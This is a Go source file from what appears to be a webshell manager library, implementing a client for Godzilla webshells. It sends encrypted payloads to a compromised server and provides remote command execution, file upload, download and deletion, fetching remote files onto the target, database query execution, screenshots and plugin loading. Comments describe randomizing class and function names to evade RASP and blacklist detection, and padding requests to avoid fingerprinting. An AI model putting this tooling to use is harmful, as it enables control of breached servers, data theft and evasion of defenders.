package wsm

import (
	"bytes"
	"errors"
	"fmt"
	"github.com/Go0p/wsm/lib/dynamic"
	"github.com/Go0p/wsm/lib/gzip"
	"github.com/Go0p/wsm/lib/httpx"
	"github.com/Go0p/wsm/lib/payloads"
	"github.com/Go0p/wsm/lib/shell"
	"github.com/Go0p/wsm/lib/shell/godzilla"
	"github.com/Go0p/wsm/lib/utils"
	"strconv"
	"strings"
)

type GodzillaInfo struct {
	shell.BaseShell
	Key       string
	secretKey []byte
	// 哥斯拉的一些加密模式
	Crypto godzilla.CrypticType
	// 字符编码
	Encode                  string
	ReqLeft                 string
	ReqRight                string
	dynamicClassNameHashMap map[string]string
}

func NewGodzillaInfo(g *GodzillaInfo) (*GodzillaInfo, error) {
	g.secretKey = utils.SecretKey(g.Key)
	g.dynamicClassNameHashMap = make(map[string]string, 2)
	if len(g.Encode) == 0 {
		g.Encode = "utf-8"
	}
	if len(g.Crypto) == 0 {
		return nil, errors.New("未指定加密类型")
	}
	return g, nil
}

func (g *GodzillaInfo) GetPayload() []byte {
	if g.Script == shell.JavaScript {
		data := payloads.GodClassFiles
		// 原始类名为 payloadv4
		return g.dynamicUpdateClassName("payloadv4", data)
	} else if g.Script == shell.PhpScript {
		data := payloads.GodPhpFiles
		r1 := utils.RandomRangeString(20, 200)
		data = bytes.Replace(data, []byte("FLAG_STR"), []byte(r1), 1)
		return data
	} else if g.Script == shell.CsharpScript {
		data := payloads.GodDllFiles
		return data
	} else if g.Script == shell.AspScript {
		data := payloads.GodAspFiles
		return data
	} else {
		return nil
	}
}

// EvalFunc 个人简单理解为调用远程 shell 的一个方法，以及对指令的序列化，并且发送指令
func (g *GodzillaInfo) EvalFunc(className, funcName string, parameter *godzilla.Parameter) []byte {
	// 填充随机长度，避免 test 请求和 getBasicInfo 请求的长度每次都一样
	r1, r2 := utils.RandomRangeString(10, 100), utils.RandomRangeString(10, 100)
	parameter.AddString(r1, r2)
	if className != "" && len(strings.Trim(className, " ")) > 0 {
		if g.Script == shell.JavaScript {
			parameter.AddString("evalClassName", g.dynamicClassNameHashMap[className])
		} else if g.Script == shell.PhpScript || g.Script == shell.AspScript {
			parameter.AddString("codeName", className)
		} else if g.Script == shell.CsharpScript {
			parameter.AddString("evalClassName", className)
		}
	}
	parameter.AddString("methodName", funcName)
	fmt.Printf("%v\n", parameter)
	data := parameter.Serialize()
	return g.sendPayload(data)
}

func (g *GodzillaInfo) sendPayload(payload []byte) []byte {
	var enData []byte
	if g.Script == shell.AspScript {
		enData = godzilla.Encrypto(payload, g.secretKey, g.Password, g.Crypto, g.Script)
		result, ok := httpx.RequestAndParse(g.Url, g.Proxy, g.Headers, string(enData), 0, 0)
		if !ok {
			panic("EvalFunc1 error")
		}
		deData := godzilla.Decrypto(result.Data, g.secretKey, g.Password, g.Crypto, g.Script)
		return deData
	} else {
		gzipData, _ := gzip.GzipCompress(payload)
		enData = godzilla.Encrypto(gzipData, g.secretKey, g.Password, g.Crypto, g.Script)
		result, ok := httpx.RequestAndParse(g.Url, g.Proxy, g.Headers, string(enData), 0, 0)
		if !ok {
			panic("EvalFunc1 error")
		}
		deData := godzilla.Decrypto(result.Data, g.secretKey, g.Password, g.Crypto, g.Script)
		res, err := gzip.GzipDeCompress(deData)
		if err != nil {
			panic("EvalFunc error :" + err.Error())
		}
		return res
	}
}

// 替换为随机包名，用于对抗一些类黑名单机制的设备
// 在 Rasp 日志的堆栈中发现可以看到很明显的 payload.java
// 所以尝试替换一下 SourceFile 为随机
// 再尝试替换一下调用的函数为随机,如 execCommand 函数的功能有点太直白了
func (g *GodzillaInfo) dynamicUpdateClassName(oldName string, classContent []byte) []byte {
	fileName := oldName + ".java"
	fakeFileName := utils.RandomRangeString(5, 12) + ".java"

	// 替换 SourceFile Hex值为 : 000C7061796C6F61642E6A617661 / 00 0C payload.java
	classContent = dynamic.ReplaceSourceFile(classContent, fileName, fakeFileName)
	g.dynamicClassNameHashMap[fileName] = fakeFileName

	// 替换 execCommand() 函数为 whoami() 函数
	classContent = dynamic.ReplaceFuncName(classContent, "execCommand", "execCommand2")
	g.dynamicClassNameHashMap["execCommand"] = "execCommand2"

	// 随机替换类名
	newClassName := dynamic.RandomClassName()
	g.dynamicClassNameHashMap[oldName] = newClassName
	fmt.Println("随机包名Class :", g.dynamicClassNameHashMap)
	return dynamic.ReplaceClassName(classContent, oldName, newClassName)
}

func getParameter() *godzilla.Parameter {
	return &godzilla.Parameter{
		HashMap: make(map[string]interface{}, 2),
		Size:    0,
	}
}

// FirstBlood 第一次发送全部的 payload
func (g *GodzillaInfo) FirstBlood() {
	payload := g.GetPayload()
	data := godzilla.Encrypto(payload, g.secretKey, g.Password, g.Crypto, g.Script)
	_, ok := httpx.RequestAndParse(g.Url, g.Proxy, g.Headers, string(data), 0, 0)
	if !ok {
		panic("EvalFunc error")
	}
}

// 检测 payload 是否正常
func (g *GodzillaInfo) test() bool {
	parameter := getParameter()
	result := g.EvalFunc("", "test", parameter)
	if strings.Trim(string(result), " ") == "ok" {
		return true
	} else {
		return false
	}
}

// 获取基础信息
func (g *GodzillaInfo) getBasicsInfo() string {
	parameter := getParameter()
	basicsInfo := g.EvalFunc("", "getBasicsInfo", parameter)
	//
	//Map pxMap = functions.matcherTwoChild(g.basicsInfo, "(FileRoot|CurrentDir|OsInfo|CurrentUser) : (.+)");
	//g.fileRoot = (String)pxMap.get("FileRoot");
	//g.currentDir = (String)pxMap.get("CurrentDir");
	//g.currentUser = (String)pxMap.get("CurrentUser");
	//g.osInfo = (String)pxMap.get("OsInfo");
	return string(basicsInfo)
}

// 命令执行
func (g *GodzillaInfo) execCommand(commandStr string) string {
	parameter := getParameter()
	// 这个 cmdLine 多半是为了兼容 godzilla v3 ?
	parameter.AddBytes("cmdLine", []byte(commandStr))
	parameter.AddBytes("arg-0", []byte("cmd"))
	parameter.AddBytes("arg-1", []byte("/c"))
	parameter.AddBytes("arg-2", []byte(`cd /d "D:/Jdk/apache-tomcat-7.0.109/bin/"&whoami`))
	//parameter.AddBytes("args-1", []byte("whoami"))
	parameter.AddString("argsCount", "3")
	parameter.AddString("executableFile", "cmd")
	parameter.AddString("executableArgs", `/c "cd /d "D:/Jdk/apache-tomcat-7.0.109/bin/"&whoami"`)

	result := g.EvalFunc("", g.dynamicClassNameHashMap["execCommand"], parameter)
	return string(result)
}

func (g *GodzillaInfo) getFile(filePath string) string {
	parameter := getParameter()
	if len(filePath) == 0 {
		filePath = " "
	}
	parameter.AddBytes("dirName", []byte(filePath))
	return string(g.EvalFunc("", "getFile", parameter))
}

func (g *GodzillaInfo) downloadFile(fileName string) []byte {
	parameter := getParameter()
	parameter.AddBytes("fileName", []byte(fileName))
	result := g.EvalFunc("", "readFile", parameter)
	return result
}

func (g *GodzillaInfo) uploadFile(fileName string, data []byte) bool {
	parameter := getParameter()
	parameter.AddBytes("fileName", []byte(fileName))
	parameter.AddBytes("fileValue", data)
	result := g.EvalFunc("", "uploadFile", parameter)
	stateString := string(result)
	if "ok" == stateString {
		return true
	} else {
		fmt.Println(stateString)
		return false
	}
}

func (g *GodzillaInfo) copyFile(fileName, newFile string) bool {
	parameter := getParameter()
	parameter.AddBytes("srcFileName", []byte(fileName))
	parameter.AddBytes("destFileName", []byte(newFile))
	result := g.EvalFunc("", "copyFile", parameter)
	stateString := string(result)
	if "ok" == stateString {
		return true
	} else {
		fmt.Println(stateString)
		return false
	}
}

func (g *GodzillaInfo) deleteFile(fileName string) bool {
	parameter := getParameter()
	parameter.AddBytes("fileName", []byte(fileName))
	result := g.EvalFunc("", "deleteFile", parameter)
	stateString := string(result)
	if "ok" == stateString {
		return true
	} else {
		fmt.Println(stateString)
		return false
	}
}

func (g *GodzillaInfo) newFile(fileName string) bool {
	parameter := getParameter()
	parameter.AddBytes("fileName", []byte(fileName))
	result := g.EvalFunc("", "newFile", parameter)
	stateString := string(result)
	if "ok" == stateString {
		return true
	} else {
		fmt.Println(stateString)
		return false
	}
}

func (g *GodzillaInfo) moveFile(fileName, newFile string) bool {
	parameter := getParameter()
	parameter.AddBytes("srcFileName", []byte(fileName))
	parameter.AddBytes("destFileName", []byte(newFile))
	result := g.EvalFunc("", "moveFile", parameter)
	if "ok" == string(result) {
		return true
	} else {
		fmt.Println(string(result))
		return false
	}
}

func (g *GodzillaInfo) newDir(fileName string) bool {
	parameter := getParameter()
	parameter.AddBytes("dirName", []byte(fileName))
	result := g.EvalFunc("", "newDir", parameter)
	stateString := string(result)
	if "ok" == stateString {
		return true
	} else {
		fmt.Println(stateString)
		return false
	}
}

func (g *GodzillaInfo) bigFileUpload(fileName string, position int, content []byte) string {
	parameter := getParameter()
	parameter.AddBytes("fileContents", content)
	parameter.AddString("fileName", fileName)
	parameter.AddString("position", strconv.Itoa(position))
	result := g.EvalFunc("", "bigFileUpload", parameter)
	return string(result)
}

func (g *GodzillaInfo) bigFileDownload(fileName string, position, readByteNum int) []byte {
	parameter := getParameter()
	parameter.AddString("position", strconv.Itoa(position))
	parameter.AddString("readByteNum", strconv.Itoa(readByteNum))
	parameter.AddString("fileName", fileName)
	parameter.AddString("mode", "read")
	return g.EvalFunc("", "bigFileDownload", parameter)
}
func (g *GodzillaInfo) fileRemoteDown(url, saveFile string) bool {
	parameter := getParameter()
	parameter.AddBytes("url", []byte(url))
	parameter.AddBytes("saveFile", []byte(saveFile))
	result := string(g.EvalFunc("", "fileRemoteDown", parameter))
	if "ok" == result {
		return true
	} else {
		fmt.Println(result)
		return false
	}
}

func (g *GodzillaInfo) getFileSize(fileName string) int {
	parameter := getParameter()
	parameter.AddString("fileName", fileName)
	parameter.AddString("mode", "fileSize")
	result := g.EvalFunc("", "bigFileDownload", parameter)
	ret, err := strconv.Atoi(string(result))
	if err != nil {
		return -1
	} else {
		return ret
	}
}

func (g *GodzillaInfo) setFileAttr(file, fileType, fileAttr string) bool {
	parameter := getParameter()
	parameter.AddString("type", fileType)
	parameter.AddBytes("fileName", []byte(file))
	parameter.AddString("attr", fileAttr)
	result := string(g.EvalFunc("", "setFileAttr", parameter))
	if "ok" == (result) {
		return true
	} else {
		fmt.Println(result)
		return false
	}
}

func (g *GodzillaInfo) execSql(dbType, dbHost, dbUsername, dbPassword, execType, execSql string, dbPort int) string {
	parameter := getParameter()
	parameter.AddString("dbType", dbType)
	parameter.AddString("dbHost", dbHost)
	parameter.AddString("dbPort", strconv.Itoa(dbPort))
	parameter.AddString("dbUsername", dbUsername)
	parameter.AddString("dbPassword", dbPassword)
	parameter.AddString("execType", execType)
	parameter.AddBytes("execSql", []byte(execSql))
	result := g.EvalFunc("", "execSql", parameter)
	return string(result)
}

//func (g *GodzillaInfo) currentDir() string {
//if (this.currentDir != null) {
//return functions.formatDir(this.currentDir);
//} else {
//this.getBasicsInfo();
//return functions.formatDir(this.currentDir);
//}
//}

// Include 远程 shell 加载插件
func (g *GodzillaInfo) Include(codeName string, binCode []byte) bool {
	parameter := getParameter()
	if g.Script == shell.JavaScript {
		binCode = g.dynamicUpdateClassName(codeName, binCode)
		codeName = g.dynamicClassNameHashMap[codeName]
		if codeName != "" {
			parameter.AddString("codeName", codeName)
			parameter.AddBytes("binCode", binCode)
			result := g.EvalFunc("", "include", parameter)
			resultString := strings.Trim(string(result), " ")
			if resultString == "ok" {
				return true
			} else {
				fmt.Println(resultString)
				return false
			}
		} else {
			fmt.Println(fmt.Printf("类: %s 映射不存在", codeName))
			return false
		}
	} else if g.Script == shell.PhpScript {
		parameter.AddString("codeName", codeName)
		parameter.AddBytes("binCode", binCode)
		result := g.EvalFunc("", "includeCode", parameter)
		resultString := strings.Trim(string(result), " ")
		if resultString == "ok" {
			return true
		} else {
			fmt.Println(resultString)
			return false
		}
	} else if g.Script == shell.CsharpScript {
		parameter.AddString("codeName", codeName)
		parameter.AddBytes("binCode", binCode)
		result := g.EvalFunc("", "include", parameter)
		resultString := strings.Trim(string(result), " ")
		if resultString == "ok" {
			return true
		} else {
			fmt.Println(resultString)
			return false
		}
	} else {
		return false
	}

}

// 销毁一个会话中的全部数据,这样做的效果有，清除目标服务器上的 sess_PHPSESSID 文件
func (g *GodzillaInfo) close() bool {
	parameter := getParameter()
	result := string(g.EvalFunc("", "close", parameter))
	if "ok" == result {
		return true
	} else {
		fmt.Println(result)
		return false
	}
}
func (g *GodzillaInfo) screen() string {
	parameter := getParameter()
	result := string(g.EvalFunc("", "screen", parameter))
	if len(result) != 0 {
		return result
	}
	return ""
}

func (g *GodzillaInfo) Ping(p shell.IParams) bool {
	return g.test()
}

func (g *GodzillaInfo) BasicInfo() string {
	return g.getBasicsInfo()
}

func (g *GodzillaInfo) CommandExec() string {
	return g.execCommand(`cmd /c "cd /d "D:/Jdk/apache-tomcat-7.0.109/bin/"&whoami"`)
}
